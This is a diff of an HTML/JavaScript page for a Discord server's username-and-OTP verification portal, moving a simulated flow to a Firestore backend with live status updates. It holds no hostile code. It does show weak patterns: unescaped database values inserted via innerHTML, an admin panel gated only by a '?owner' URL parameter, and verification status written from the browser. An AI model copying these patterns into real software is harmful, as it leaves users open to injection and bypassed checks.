@@ -3,28 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dormz★Member | Verification</title>
+    <title>Verification Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
         
         body {
-            background-color: #09090b;
+            background-color: #09090b; /* Void Ash Theme */
+            /* UNTUK CUSTOM BACKGROUND: Hapus tanda /* di bawah ini dan masukkan link gambarmu */
+            /* background-image: url('LINK_GAMBAR_DISINI'); background-size: cover; background-position: center; background-blend-mode: overlay; */
             font-family: 'Poppins', sans-serif;
             overflow-x: hidden;
             color: #e4e4e7;
         }
 
         .top-bar {
-            background-color: #09090b;
-            border-bottom: 1px solid #18181b;
+            background-color: transparent;
+            z-index: 60;
         }
 
         .main-card {
             background-color: #121214;
             border: 1px solid #27272a;
-            border-radius: 2rem;
+            border-radius: 1.5rem;
             box-shadow: 0 20px 40px -10px rgba(0,0,0,0.8);
         }
 
@@ -37,17 +39,16 @@
         .input-dark:focus {
             outline: none;
             border-color: #52525b;
-            box-shadow: 0 0 15px rgba(82, 82, 91, 0.2);
         }
         
         .input-error {
             border-color: #ef4444 !important;
-            box-shadow: 0 0 15px rgba(239, 68, 68, 0.2) !important;
+            color: #ef4444;
         }
 
         .otp-box {
-            width: 45px;
-            height: 55px;
+            width: 50px;
+            height: 60px;
             background-color: #09090b;
             color: white;
             font-size: 1.5rem;
@@ -57,23 +58,28 @@
             transition: all 0.2s ease;
         }
         .otp-box:focus {
-            border-color: #71717a;
+            border-color: #e4e4e7;
             outline: none;
-            box-shadow: 0 0 12px rgba(113, 113, 122, 0.3);
         }
 
-        #sidebarLeft, #sidebarRight {
+        #sidebarLeft {
             transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 55;
+        }
+        #sidebarRight {
+            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 55;
         }
         #overlay {
             transition: opacity 0.4s ease;
-            backdrop-filter: blur(4px);
+            backdrop-filter: blur(2px);
+            z-index: 40;
         }
 
         .status-dot {
             position: absolute;
-            bottom: 0;
-            right: 0;
+            bottom: -2px;
+            right: -2px;
             width: 12px;
             height: 12px;
             border-radius: 50%;
@@ -87,19 +93,20 @@
 </head>
 <body class="min-h-screen flex flex-col relative">
 
-    <!-- GANTI LAGU DI SINI (Harus format .mp3) -->
+    <!-- AUDIO PLAYER -->
     <audio id="bgMusic" loop>
         <source src="https://cdn.pixabay.com/download/audio/2022/05/27/audio_1808fbf07a.mp3" type="audio/mpeg">
     </audio>
 
-    <nav class="top-bar w-full h-16 flex items-center justify-between px-4 sm:px-6 fixed top-0 z-[60]">
-        <div class="flex gap-5">
+    <!-- NAVBAR (Tetap Paling Atas) -->
+    <nav class="top-bar w-full h-16 flex items-center justify-between px-6 fixed top-0">
+        <div class="flex gap-6 items-center">
             <button onclick="toggleSidebarLeft()" class="text-[#71717a] hover:text-[#e4e4e7] transition text-2xl">
-                <i class="fas fa-user-alt"></i>
+                <i class="fas fa-user"></i>
             </button>
             <button onclick="toggleMusic()" id="musicBtn" class="text-[#71717a] hover:text-[#e4e4e7] transition text-2xl relative">
                 <i class="fas fa-music"></i>
-                <i id="musicCross" class="fas fa-times absolute -bottom-1 -right-2 text-[12px] text-red-500 font-bold hidden"></i>
+                <i id="musicCross" class="fas fa-times absolute -bottom-1 -right-2 text-[12px] text-red-500 font-bold"></i>
             </button>
         </div>
         <div id="adminContainer" class="hidden">
@@ -109,121 +116,93 @@
         </div>
     </nav>
 
-    <div id="overlay" onclick="closeAllSidebars()" class="fixed inset-0 bg-black/80 z-[40] opacity-0 pointer-events-none hidden"></div>
+    <div id="overlay" onclick="closeAllSidebars()" class="fixed inset-0 bg-black/60 opacity-0 pointer-events-none hidden"></div>
 
-    <!-- SIDEBAR KIRI (MEMBER LIST) -->
-    <aside id="sidebarLeft" class="fixed top-0 left-0 h-full w-72 bg-[#121214] shadow-2xl z-[50] transform -translate-x-full flex flex-col pt-20 border-r border-[#27272a]">
+    <!-- SIDEBAR KIRI (STAFF & MEMBERS) -->
+    <aside id="sidebarLeft" class="fixed top-0 left-0 h-full w-[300px] bg-[#121214] shadow-2xl transform -translate-x-full flex flex-col pt-20 border-r border-[#27272a]">
         <div class="p-4 border-b border-[#27272a]">
             <p class="text-[10px] font-bold text-center tracking-widest text-[#a1a1aa] uppercase">
-                Active Member - <span id="onlineCount" class="text-white">0</span> <span class="mx-1">//</span> Total Member - <span id="totalCount" class="text-white">0</span>
+                ACTIVE MEMBER - <span id="onlineCount" class="text-white">0</span> <span class="mx-2">//</span> TOTAL MEMBER - <span id="totalCount" class="text-white">0</span>
             </p>
         </div>
         
         <div class="flex-grow overflow-y-auto p-4 space-y-4">
-            <h3 class="text-[10px] font-bold text-[#52525b] uppercase tracking-widest mb-2 mt-2">Server Staff</h3>
+            <h3 class="text-[10px] font-bold text-[#52525b] uppercase tracking-widest mb-3 mt-2">SERVER STAFF</h3>
             
-            <div id="staffList" class="space-y-2">
-                <!-- GANTI STAFF DI SINI -->
-                <div class="flex items-center gap-3 bg-[#18181b] p-2.5 rounded-lg border border-[#27272a]">
-                    <div class="relative">
-                        <img src="https://ui-avatars.com/api/?name=Zoyu&background=27272a&color=fff" class="w-9 h-9 rounded-lg grayscale">
-                        <div class="status-dot bg-[#a1a1aa]"></div>
-                    </div>
-                    <div>
-                        <p class="text-xs font-bold text-[#e4e4e7] leading-tight">Zoyu Forever 👑</p>
-                        <p class="text-[10px] text-[#71717a]">Owner</p>
-                    </div>
-                </div>
-                
-                <div class="flex items-center gap-3 bg-[#18181b] p-2.5 rounded-lg border border-[#27272a]">
-                    <div class="relative">
-                        <img src="https://ui-avatars.com/api/?name=Jouhan&background=27272a&color=fff" class="w-9 h-9 rounded-lg grayscale">
-                        <div class="status-dot bg-[#a1a1aa]"></div>
-                    </div>
-                    <div>
-                        <p class="text-xs font-bold text-[#e4e4e7] leading-tight">Jouhan 🛡️</p>
-                        <p class="text-[10px] text-[#71717a]">Moderator</p>
-                    </div>
-                </div>
+            <div id="staffList" class="space-y-3">
+                <p class="text-[10px] text-[#71717a] text-center">Syncing with Discord...</p>
             </div>
 
-            <div class="mt-8 p-4 rounded-lg border border-[#27272a] border-dashed text-center bg-[#09090b]">
+            <div class="mt-8 p-4 rounded-xl border border-[#27272a] border-dashed text-center bg-[#09090b]">
                 <p class="text-[10px] text-[#71717a] leading-relaxed">Verified members list is hidden to maintain performance. View the full list on Discord.</p>
             </div>
         </div>
     </aside>
 
     <!-- SIDEBAR KANAN (ADMIN PANEL) -->
-    <aside id="sidebarRight" class="fixed top-0 right-0 h-full w-72 bg-[#121214] shadow-2xl z-[50] transform translate-x-full flex flex-col pt-20 border-l border-[#27272a]">
+    <aside id="sidebarRight" class="fixed top-0 right-0 h-full w-[300px] bg-[#121214] shadow-2xl transform translate-x-full flex flex-col pt-20 border-l border-[#27272a]">
         <div class="p-4 border-b border-[#27272a]">
             <p class="text-[10px] font-bold text-center tracking-widest text-red-500 uppercase">
-                <i class="fas fa-shield-alt mr-1"></i> Admin Dashboard
+                <i class="fas fa-shield-alt mr-1"></i> ADMIN LOGS
             </p>
         </div>
-        
         <div class="flex-grow overflow-y-auto p-4 space-y-4">
-            <h3 class="text-[10px] font-bold text-[#52525b] uppercase tracking-widest mb-2 mt-2">Live Verification Logs</h3>
-            
-            <div class="space-y-2" id="adminLogsContainer">
+            <h3 class="text-[10px] font-bold text-[#52525b] uppercase tracking-widest mb-2 mt-2">LIVE VERIFICATION</h3>
+            <div id="adminLogsContainer" class="space-y-2">
                 <div class="p-3 rounded-lg border border-[#27272a] bg-[#09090b] text-center">
-                    <p class="text-[10px] text-[#71717a]">No active verification requests.</p>
+                    <p class="text-[10px] text-[#71717a]">No active requests.</p>
                 </div>
-                <!-- Log masuk akan muncul di sini nanti (Tahap 2) -->
             </div>
-
-            <h3 class="text-[10px] font-bold text-[#52525b] uppercase tracking-widest mb-2 mt-6">Bot Control</h3>
-            <button class="w-full bg-[#18181b] hover:bg-[#27272a] text-[#a1a1aa] border border-[#27272a] transition p-3 rounded-lg text-xs font-bold text-left flex justify-between items-center">
-                <span>Restart Bot Zoyuto</span>
-                <i class="fas fa-power-off text-red-500"></i>
+            <button onclick="window.location.reload()" class="mt-6 w-full bg-[#18181b] hover:bg-[#27272a] text-[#a1a1aa] border border-[#27272a] transition p-3 rounded-lg text-xs font-bold text-left flex justify-between items-center">
+                <span>Force Refresh UI</span>
+                <i class="fas fa-sync text-[#71717a]"></i>
             </button>
         </div>
     </aside>
 
-    <main class="flex-grow flex items-center justify-center p-4 pt-20 pb-16 relative z-10">
+    <!-- KONTEN TENGAH -->
+    <main class="flex-grow flex items-center justify-center p-4 pt-16 pb-16 relative z-10">
         
+        <!-- STEP 1: USERNAME -->
         <div id="step1-card" class="main-card w-full max-w-sm p-8 flex flex-col items-center relative transition-all duration-500">
             
-            <div id="botStatusBadge" class="absolute -top-3 bg-[#09090b] px-4 py-1.5 rounded-full border border-[#27272a] text-[10px] font-bold text-[#a1a1aa] shadow-lg flex items-center gap-2">
-                <span class="w-1.5 h-1.5 rounded-full bg-[#52525b]"></span> <span class="text-[#71717a]">Bot Standby</span>
+            <div class="absolute -top-3 bg-[#09090b] px-4 py-1.5 rounded-full border border-[#27272a] text-[10px] font-bold shadow-lg flex items-center gap-2">
+                <span class="w-1.5 h-1.5 rounded-full bg-[#52525b]" id="botStatusDot"></span> 
+                <span id="botStatusText" class="text-[#e4e4e7]">Connecting...</span>
             </div>
 
-            <!-- GANTI NAMA & FOTO SERVER DI SINI -->
-            <div class="w-20 h-20 bg-[#27272a] rounded-2xl p-1 shadow-2xl mb-5 mt-4">
-                <div class="w-full h-full bg-[#09090b] rounded-xl flex items-center justify-center text-xs text-center font-bold overflow-hidden">
-                    <img src="https://ui-avatars.com/api/?name=Zoyu+Shops&background=09090b&color=e4e4e7&size=100" alt="Server" class="grayscale">
-                </div>
+            <div class="w-20 h-20 bg-[#09090b] border border-[#27272a] rounded-2xl shadow-2xl mb-4 mt-6 overflow-hidden flex items-center justify-center">
+                <img id="dynamicServerIcon" src="https://ui-avatars.com/api/?name=S&background=09090b&color=52525b" alt="Server" class="w-full h-full object-cover">
             </div>
 
-            <h2 class="text-2xl font-extrabold mb-2 text-center text-white tracking-wide">Zoyu Shops</h2>
-            <p class="text-[11px] text-center font-semibold mb-8 px-2 text-[#a1a1aa] leading-relaxed">
+            <h2 id="dynamicServerName" class="text-2xl font-extrabold mb-2 text-center text-white tracking-wide">Syncing...</h2>
+            <p class="text-[11px] text-center font-semibold mb-8 text-[#a1a1aa] leading-relaxed">
                 To get yourself as "dormz★member"<br>you should verify your username account
             </p>
 
-            <div class="w-full mb-8 relative">
+            <div class="w-full mb-8">
                 <label class="block text-[10px] font-bold mb-2 ml-1 text-[#71717a] uppercase tracking-wider">Discord username</label>
                 <div class="relative">
                     <span class="absolute left-4 top-3.5 text-[#52525b] font-bold text-sm">@</span>
                     <input type="text" id="usernameInput" placeholder="username" autocomplete="off"
                            class="input-dark w-full h-12 pl-10 pr-4 rounded-xl text-sm font-semibold">
                 </div>
-                <p id="helperText" class="text-[9px] text-[#52525b] mt-2 ml-1 transition-all"><i class="fas fa-lock mr-1"></i> Ensure Discord DMs are OPEN for the code.</p>
                 
-                <!-- ERROR MESSAGE HIDDEN BY DEFAULT -->
-                <div id="errorBox" class="hidden mt-3 bg-red-500/10 border border-red-500/20 rounded-lg p-2.5 text-center transition-all">
-                    <p class="text-[11px] font-bold text-red-500 uppercase tracking-wide">Username Not Found!</p>
-                    <p class="text-[9px] text-[#a1a1aa] mt-0.5">Please make sure you're joined the server first.</p>
-                </div>
+                <!-- ERROR TEXT MERAH -->
+                <p id="errorText" class="text-[10px] font-bold text-red-500 mt-2 ml-1 uppercase tracking-wider hidden">USERNAME NOT FOUND!</p>
+                <p id="helperText" class="text-[9px] text-[#52525b] mt-1.5 ml-1 transition-all"><i class="fas fa-lock mr-1"></i> Ensure Discord DMs are OPEN for the code.</p>
             </div>
 
-            <button onclick="requestVerification()" id="btnRequest" class="w-full bg-[#e4e4e7] hover:bg-white text-[#09090b] transition h-12 rounded-xl font-extrabold text-sm shadow-lg">
+            <button onclick="requestOTP()" id="btnRequest" class="w-full bg-[#e4e4e7] hover:bg-white text-[#09090b] transition h-12 rounded-xl font-extrabold text-sm shadow-lg">
                 Verify Account
             </button>
         </div>
 
+        <!-- STEP 2: OTP (Sembunyi) -->
         <div id="step2-card" class="main-card w-full max-w-sm p-8 flex flex-col items-center relative hidden opacity-0 transition-all duration-500">
             
-            <h2 class="text-2xl font-extrabold mb-3 text-center text-white tracking-wide">Username found!</h2>
-            <p class="text-[11px] text-center font-semibold mb-8 px-2 text-[#a1a1aa] leading-relaxed">
+            <h2 class="text-2xl font-extrabold mb-3 mt-4 text-center text-white tracking-wide">Username found!</h2>
+            <p class="text-[11px] text-center font-semibold mb-8 text-[#a1a1aa] leading-relaxed">
                 Please enter the code we sent<br>
                 you from our bot to make sure<br>
                 you're real and not some sort<br>
@@ -238,34 +217,204 @@
                 <input type="text" maxlength="1" class="otp-box font-bold">
             </div>
 
+            <p id="otpErrorText" class="text-[10px] font-bold text-red-500 hidden mb-2 uppercase tracking-widest text-center">INVALID CODE!</p>
+
             <p id="timerText" class="text-[10px] font-bold text-center mt-2 text-[#71717a] uppercase tracking-widest">
                 Code expires in <span id="countdown" class="text-[#e4e4e7]">2:00</span>
             </p>
             
             <div id="loadingVerifying" class="hidden flex-col items-center mt-4">
                 <i class="fas fa-circle-notch fa-spin text-xl text-[#a1a1aa] mb-3"></i>
-                <p class="text-[10px] font-bold text-[#a1a1aa] uppercase tracking-widest">Verifying code...</p>
+                <p class="text-[10px] font-bold text-[#a1a1aa] uppercase tracking-widest">VERIFYING...</p>
             </div>
 
             <button onclick="cancelVerification()" class="mt-8 text-[10px] text-[#52525b] hover:text-[#a1a1aa] transition font-semibold uppercase tracking-widest">
-                <i class="fas fa-arrow-left mr-1"></i> Cancel
+                <i class="fas fa-arrow-left mr-1"></i> CANCEL
             </button>
         </div>
 
     </main>
 
-    <footer class="fixed bottom-4 w-full text-center z-0 pointer-events-none opacity-50">
+    <footer class="fixed bottom-4 w-full text-center z-0 pointer-events-none opacity-40">
         <p class="text-[9px] font-bold text-[#52525b] tracking-widest uppercase">
             Web by reunite & powered by gemini 🌹
         </p>
     </footer>
 
+    <!-- FIREBASE & LOGIC -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.2/firebase-app.js";
+        import { getFirestore, collection, addDoc, onSnapshot, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.5.2/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDomIAXu2J5j6ZA0Yl6qrhm96mwAKPOw20",
+            authDomain: "dormz-member-access.firebaseapp.com",
+            projectId: "dormz-member-access",
+            storageBucket: "dormz-member-access.firebasestorage.app",
+            messagingSenderId: "374656483125",
+            appId: "1:374656483125:web:7cbfc0b461544abe1d967c"
+        };
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        let currentRequestId = null;
+
+        // REALTIME DATA SINKRONISASI
+        onSnapshot(doc(db, "verify_portal", "main_config"), (docData) => {
+            if (docData.exists()) {
+                const data = docData.data();
+                
+                if(data.botStatus === 'Online') {
+                    document.getElementById('botStatusDot').classList.replace('bg-[#52525b]', 'bg-white');
+                    document.getElementById('botStatusText').textContent = 'Bot Online';
+                }
+
+                if(data.serverName) document.getElementById('dynamicServerName').textContent = data.serverName;
+                if(data.serverIcon) document.getElementById('dynamicServerIcon').src = data.serverIcon;
+                if(data.onlineCount !== undefined) document.getElementById('onlineCount').textContent = data.onlineCount;
+                if(data.totalCount !== undefined) document.getElementById('totalCount').textContent = data.totalCount;
+                
+                if(data.staffData && data.staffData.length > 0) {
+                    const staffHtml = data.staffData.map(staff => `
+                        <div class="flex items-center gap-3 bg-[#09090b] p-3 rounded-xl border border-[#27272a]">
+                            <div class="relative">
+                                <img src="${staff.avatar}" class="w-10 h-10 rounded-full object-cover border border-[#27272a]">
+                                <div class="status-dot ${staff.online ? 'bg-green-500' : 'bg-[#52525b]'}"></div>
+                            </div>
+                            <div>
+                                <p class="text-xs font-bold text-[#e4e4e7] leading-tight">${staff.name}</p>
+                                <p class="text-[10px] text-[#71717a] mt-0.5">${staff.role}</p>
+                            </div>
+                        </div>
+                    `).join('');
+                    document.getElementById('staffList').innerHTML = staffHtml;
+                }
+            }
+        });
+
+        // REQUEST OTP KE BOT
+        window.requestOTP = async function() {
+            const usernameInput = document.getElementById('usernameInput');
+            const username = usernameInput.value.trim().toLowerCase();
+            const btn = document.getElementById('btnRequest');
+            const errorText = document.getElementById('errorText');
+            const helperText = document.getElementById('helperText');
+            
+            if(!username) return;
+
+            errorText.classList.add('hidden');
+            helperText.classList.remove('hidden');
+            usernameInput.classList.remove('input-error');
+            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Processing...';
+            btn.disabled = true;
+
+            try {
+                const docRef = await addDoc(collection(db, "verify_portal", "main_config", "requests"), {
+                    discordUsername: username,
+                    status: 'pending',
+                    timestamp: new Date()
+                });
+                
+                currentRequestId = docRef.id;
+
+                const unsub = onSnapshot(docRef, (snap) => {
+                    const reqData = snap.data();
+                    if(reqData.status === 'otp_sent') {
+                        document.getElementById('step1-card').classList.add('hidden', 'opacity-0');
+                        const step2 = document.getElementById('step2-card');
+                        step2.classList.remove('hidden');
+                        setTimeout(() => step2.classList.remove('opacity-0'), 50);
+                        
+                        document.querySelectorAll('.otp-box')[0].focus();
+                        window.startTimer();
+                        unsub(); 
+
+                    } else if(reqData.status === 'user_not_found') {
+                        showError();
+                        unsub();
+                    }
+                });
+            } catch (e) {
+                showError();
+            }
+        }
+
+        function showError() {
+            const btn = document.getElementById('btnRequest');
+            const usernameInput = document.getElementById('usernameInput');
+            btn.innerHTML = 'Verify Account';
+            btn.disabled = false;
+            usernameInput.classList.add('input-error');
+            document.getElementById('helperText').classList.add('hidden');
+            document.getElementById('errorText').classList.remove('hidden');
+        }
+
+        // KIRIM OTP
+        window.submitOTP = async function() {
+            const inputs = document.querySelectorAll('.otp-box');
+            let otpVal = "";
+            inputs.forEach(i => otpVal += i.value);
+            
+            if(otpVal.length !== 5 || !currentRequestId) return;
+
+            document.getElementById('timerText').classList.add('hidden');
+            document.getElementById('loadingVerifying').classList.remove('hidden');
+            document.getElementById('loadingVerifying').classList.add('flex');
+            inputs.forEach(i => i.disabled = true);
+
+            await updateDoc(doc(db, "verify_portal", "main_config", "requests", currentRequestId), {
+                status: 'checking_otp',
+                enteredOtp: otpVal
+            });
+
+            const unsubOtp = onSnapshot(doc(db, "verify_portal", "main_config", "requests", currentRequestId), (snap) => {
+                const finalData = snap.data();
+                if(finalData.status === 'verified') {
+                    document.getElementById('step2-card').innerHTML = `
+                        <div class="text-[#e4e4e7] text-5xl mb-4 mt-6"><i class="fas fa-check-circle"></i></div>
+                        <h2 class="text-2xl font-extrabold mb-2 text-center text-white tracking-wide">SUCCESS</h2>
+                        <p class="text-[11px] text-center font-semibold text-[#a1a1aa] leading-relaxed mb-6">
+                            You've been granted the role.<br>Welcome to The Dormz.
+                        </p>
+                    `;
+                    unsubOtp();
+                } else if (finalData.status === 'wrong_otp') {
+                    document.getElementById('loadingVerifying').classList.add('hidden');
+                    document.getElementById('loadingVerifying').classList.remove('flex');
+                    document.getElementById('timerText').classList.remove('hidden');
+                    document.getElementById('otpErrorText').classList.remove('hidden');
+                    inputs.forEach(i => { i.disabled = false; i.value = ''; i.classList.add('input-error'); });
+                    inputs[0].focus();
+                    
+                    updateDoc(doc(db, "verify_portal", "main_config", "requests", currentRequestId), { status: 'otp_sent' });
+                    unsubOtp();
+                }
+            });
+        }
+    </script>
+
+    <!-- UI SCRIPTS -->
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             const urlParams = new URLSearchParams(window.location.search);
             if (urlParams.has('owner')) {
                 document.getElementById('adminContainer').classList.remove('hidden');
             }
+
+            const inputs = document.querySelectorAll('.otp-box');
+            inputs.forEach((input, index) => {
+                input.addEventListener('keyup', (e) => {
+                    input.classList.remove('input-error');
+                    document.getElementById('otpErrorText').classList.add('hidden');
+
+                    if (e.key.length === 1 && input.value !== '') {
+                        if (index < inputs.length - 1) inputs[index + 1].focus();
+                        else if (index === inputs.length - 1) window.submitOTP();
+                    } else if (e.key === 'Backspace') {
+                        if (index > 0) inputs[index - 1].focus();
+                    }
+                });
+            });
         });
 
         const overlay = document.getElementById('overlay');
@@ -277,10 +426,8 @@
                 sidebarLeft.classList.remove('-translate-x-full');
                 overlay.classList.remove('hidden', 'opacity-0');
                 overlay.classList.add('opacity-100');
-                sidebarRight.classList.add('translate-x-full'); // Tutup kanan jika terbuka
-            } else {
-                closeAllSidebars();
-            }
+                sidebarRight.classList.add('translate-x-full');
+            } else closeAllSidebars();
         }
 
         function toggleSidebarRight() {
@@ -288,13 +435,11 @@
                 sidebarRight.classList.remove('translate-x-full');
                 overlay.classList.remove('hidden', 'opacity-0');
                 overlay.classList.add('opacity-100');
-                sidebarLeft.classList.add('-translate-x-full'); // Tutup kiri jika terbuka
-            } else {
-                closeAllSidebars();
-            }
+                sidebarLeft.classList.add('-translate-x-full');
+            } else closeAllSidebars();
         }
 
-        function closeAllSidebars() {
+        window.closeAllSidebars = function() {
             sidebarLeft.classList.add('-translate-x-full');
             sidebarRight.classList.add('translate-x-full');
             overlay.classList.remove('opacity-100');
@@ -309,7 +454,7 @@
             const musicBtn = document.getElementById('musicBtn');
 
             if (!isMusicPlaying) {
-                bgMusic.play().catch(e => console.log("Auto-play prevented"));
+                bgMusic.play().catch(e => console.log(e));
                 isMusicPlaying = true;
                 musicCross.classList.add('hidden');
                 musicBtn.classList.replace('text-[#71717a]', 'text-[#e4e4e7]');
@@ -320,103 +465,28 @@
                 musicBtn.classList.replace('text-[#e4e4e7]', 'text-[#71717a]');
             }
         }
-        
-        // Agar pas web dibuka, silang merahnya ada karena musik belum play
-        document.getElementById('musicCross').classList.remove('hidden');
-
-        const inputs = document.querySelectorAll('.otp-box');
-        inputs.forEach((input, index) => {
-            input.addEventListener('keyup', (e) => {
-                if (e.key.length === 1 && input.value !== '') {
-                    input.value = input.value.toUpperCase();
-                    if (index < inputs.length - 1) inputs[index + 1].focus();
-                } else if (e.key === 'Backspace') {
-                    if (index > 0) inputs[index - 1].focus();
-                }
-            });
-        });
 
         let countdownInterval;
-        
-        window.requestVerification = function() {
-            const usernameInput = document.getElementById('usernameInput');
-            const username = usernameInput.value.trim().toLowerCase();
-            const btn = document.getElementById('btnRequest');
-            const errorBox = document.getElementById('errorBox');
-            
-            if(!username) return;
-
-            // Reset UI
-            errorBox.classList.add('hidden');
-            usernameInput.classList.remove('input-error');
-            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Processing...';
-            btn.classList.replace('bg-[#e4e4e7]', 'bg-[#27272a]');
-            btn.classList.replace('text-[#09090b]', 'text-[#71717a]');
-            btn.disabled = true;
-
-            // SIMULASI LOADING (Animasi Bohongan untuk Tahap 1)
-            setTimeout(() => {
-                // SIMULASI CEK ERROR: Kalau ngetik "salah", muncul error!
-                if(username === "salah" || username === "error") {
-                    btn.innerHTML = 'Verify Account';
-                    btn.classList.replace('bg-[#27272a]', 'bg-[#e4e4e7]');
-                    btn.classList.replace('text-[#71717a]', 'text-[#09090b]');
-                    btn.disabled = false;
-                    
-                    usernameInput.classList.add('input-error');
-                    errorBox.classList.remove('hidden');
-                    return; // Stop di sini
-                }
-
-                // Kalau "bener", lanjut ke layar OTP
-                document.getElementById('step1-card').classList.add('hidden', 'opacity-0');
-                
-                const step2 = document.getElementById('step2-card');
-                step2.classList.remove('hidden');
-                setTimeout(() => step2.classList.remove('opacity-0'), 50);
-                
-                inputs[0].focus();
-                startTimer();
-            }, 1200);
-        }
-
-        window.cancelVerification = function() {
-            clearInterval(countdownInterval);
-            document.getElementById('step2-card').classList.add('hidden', 'opacity-0');
-            
-            const step1 = document.getElementById('step1-card');
-            step1.classList.remove('hidden');
-            setTimeout(() => step1.classList.remove('opacity-0'), 50);
-            
-            const btn = document.getElementById('btnRequest');
-            btn.innerHTML = 'Verify Account';
-            btn.classList.replace('bg-[#27272a]', 'bg-[#e4e4e7]');
-            btn.classList.replace('text-[#71717a]', 'text-[#09090b]');
-            btn.disabled = false;
-            inputs.forEach(i => i.value = ''); 
-            
-            document.getElementById('loadingVerifying').classList.add('hidden');
-            document.getElementById('timerText').classList.remove('hidden');
-            inputs.forEach(i => i.disabled = false);
-        }
-
-        function startTimer() {
+        window.startTimer = function() {
             let timeLeft = 120; 
             const display = document.getElementById('countdown');
-            
             clearInterval(countdownInterval);
             countdownInterval = setInterval(() => {
                 const minutes = Math.floor(timeLeft / 60);
                 let seconds = timeLeft % 60;
                 seconds = seconds < 10 ? '0' + seconds : seconds;
                 display.textContent = `${minutes}:${seconds}`;
-                
                 if (--timeLeft < 0) {
                     clearInterval(countdownInterval);
                     display.textContent = "0:00";
-                    cancelVerification();
+                    window.cancelVerification();
                 }
             }, 1000);
+        }
+
+        window.cancelVerification = function() {
+            clearInterval(countdownInterval);
+            document.location.reload(); 
         }
     </script>
 </body>
